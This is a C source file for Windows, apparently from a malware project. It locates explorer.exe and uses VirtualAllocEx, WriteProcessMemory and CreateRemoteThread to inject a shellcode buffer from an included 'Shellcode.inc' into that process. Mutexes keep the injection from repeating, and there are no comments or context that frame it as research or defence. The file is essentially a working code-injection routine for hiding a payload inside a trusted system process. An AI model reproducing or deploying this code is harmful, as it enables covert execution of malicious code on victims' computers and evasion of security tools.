#define _WIN32_IE 0x0400

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <shlobj.h>

#include <tlhelp32.h>
#include "Shellcode.inc"

#define MAX_FILEPATH	255

#define KEY "Password"

bool DirectoryExists(const char *DirectoryPath)
{
	DWORD Attr = GetFileAttributes(DirectoryPath);
	return ((Attr != 0xFFFFFFFF) && ((Attr & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY));
}

char *StrChar(const char *p, int ch)
{
	union {
		const char *cp;
		char *p;
	} u;
	u.cp = p;
	for (;; ++u.p)
	{
		if (*u.p == ch) return u.p;
		if (*u.p == '\0') return NULL;
	}
}

bool ForceDirectories(const char *Path)
{
	char *pp, *sp, PathCopy[1024];
	if (strlen(Path) >= sizeof(PathCopy)) return false;
	strncpy(PathCopy, Path, sizeof(PathCopy));

	char Delimiter = '\\';

	bool Created = true;
	pp = PathCopy;
	while (Created && (sp = StrChar(pp, Delimiter)) != NULL)
	{
		if (sp != pp)
		{
			*sp = '\0';
			if (!DirectoryExists(PathCopy)) Created = CreateDirectory(PathCopy, NULL);
			*sp = Delimiter;
		}
		pp = sp + 1;
	}
	return Created;
}



char CharToUpper(char c)
{
	return ((c < 123 && c > 96) ? (c - 32) : c);
}

int StrCaseCompare(char *Str1, char *Str2)
{
	if (Str1 == NULL || Str2 == NULL) return -1;
	char *s1 = Str1, *s2 = Str2;
	
	while (*s1 != '\0' && *s2 != '\0')
	{
		if (CharToUpper(*s1++) != CharToUpper(*s2++)) return -1;
	}
	if (*s1 != *s2) return -1;
	else return 0;
}

DWORD GetProcessIdFromName(char *ProcessName)
{
    PROCESSENTRY32 ProcessEntry;
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hProcessSnap == INVALID_HANDLE_VALUE) return 0;

	ProcessEntry.dwSize = sizeof(ProcessEntry);
	if (!Process32First(hProcessSnap, &ProcessEntry))
    {
        CloseHandle(hProcessSnap);          // clean the snapshot object
		return 0;
    }

    do
    {
		if (StrCaseCompare(ProcessName, ProcessEntry.szExeFile) == 0)
        {
            CloseHandle(hProcessSnap);
			return ProcessEntry.th32ProcessID;
        }
	}
	while (Process32Next(hProcessSnap, &ProcessEntry));
	CloseHandle (hProcessSnap);
	return 0;     
}

HANDLE InjectShellcode(HANDLE hProcess, unsigned char *Shellcode, int ShellcodeLen)
{
	DWORD BytesWritten, TID;
	LPVOID pThread = VirtualAllocEx(hProcess, NULL, ShellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pThread != NULL) WriteProcessMemory(hProcess, pThread, Shellcode, ShellcodeLen, &BytesWritten);
	HANDLE ThreadHandle =  CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pThread, NULL, 0, &TID);
	return ThreadHandle;
}

bool ShellcodeInjected()
{
	HANDLE hMutex = OpenMutex(MUTEX_ALL_ACCESS, false, "SHELLCODE_MUTEX");
	if (hMutex == NULL)
	{
		return false;
	}
	else
	{
		CloseHandle(hMutex);
		return true;
	}
}

void InitiateMonitoringThread()
{
	CreateMutex(NULL, 0, "7YhngylKo09H");	
	if (!(ShellcodeInjected()))
	{
		DWORD ProcessId = GetProcessIdFromName("explorer.exe");
		HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, ProcessId);
		if (hProcess != 0) 
		{
			InjectShellcode(hProcess, mthread, sizeof(mthread));
		}
	}
}